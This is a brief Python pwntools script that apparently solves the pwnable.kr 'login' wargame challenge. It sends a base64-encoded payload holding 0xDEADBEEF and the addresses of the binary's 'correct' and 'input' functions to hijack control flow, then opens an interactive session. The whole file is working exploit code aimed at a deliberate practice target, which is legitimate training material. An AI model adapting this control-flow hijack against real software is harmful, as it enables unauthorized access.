from pwn import *
import base64

#context.log_level = "debug"

LOCAL = False
if LOCAL:
    p = process("./login")
else:
    p = remote("pwnable.kr", 9003)

elf = ELF("./login")
correct_func = elf.symbols["correct"]
input_func = elf.symbols["input"]

payload = p32(0xDEADBEEF) + p32(correct_func) + p32(input_func)
payload = base64.b64encode(payload)

p.sendlineafter("Authenticate : ", payload)

p.interactive()
